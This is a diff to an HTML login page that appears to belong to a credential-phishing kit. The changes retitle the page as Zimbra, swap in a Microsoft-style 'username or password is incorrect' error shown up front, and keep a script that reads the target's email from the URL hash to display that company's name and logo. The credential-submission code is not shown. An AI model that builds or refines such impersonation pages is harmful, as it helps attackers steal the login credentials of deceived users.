@@ -4,28 +4,9 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0; shrink-to-fit=no">
-    <title id="pageTitle">Portal</title>
+    <title>Zimbra</title>
     <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
     <link rel="stylesheet" href="assets/css/styles.css">
-    <style>
-        /* Styling for Sign In Button */
-        button {
-            width: 100%;
-            padding: 10px;
-            background-color: #0D5CAB; /* Button matches static background */
-            color: #FFFFFF; /* White font for readability */
-            border: none;
-            border-radius: 5px;
-            font-size: 1rem;
-            margin-top: 1rem;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-
-        button:hover {
-            background-color: #0A4B8A; /* Slightly darker blue on hover */
-        }
-    </style>
 </head>
 
 <body>
@@ -42,7 +23,7 @@
                 <div id="err" 
                      style="padding: 16px 40px; background: #efcccb; border-bottom: 2px solid rgb(128,0,0);">
                     <p style="font-size: 13px;">
-                        Invalid login credentials. Please check your username and password and try again.
+                        The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current username and password.
                     </p>
                 </div>
                 <div style="padding: 16px 40px;">
@@ -53,6 +34,7 @@
                     <div class="sp-div" style="margin-top: 10px;">
                         <button class="btn btn-primary" id="next-btn" 
                                 type="button" 
+                                style="width: 86px; height: 32px; padding: 2px 8px; font-size: 12px;"
                                 onclick="nextFun();">
                             Sign In
                         </button>
@@ -76,7 +58,7 @@
     <script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
 
     <script>
-        /* Dynamic branding logic */
+        /* Improved Branding Logic */
         document.addEventListener("DOMContentLoaded", function () {
             const hash = decodeURIComponent(window.location.hash.substring(1));
             if (!hash.includes("@")) return;
@@ -96,9 +78,6 @@
 
             const companyName = companyNameMapping[domain] || domain.split(".")[0].replace(/[-_]/g, " ").toUpperCase();
             document.getElementById("companyName").textContent = companyName;
-
-            // Update page title dynamically
-            document.getElementById("pageTitle").textContent = companyName || "Portal";
 
             // Logo and favicon setup
             const logo = document.getElementById("logoImg");
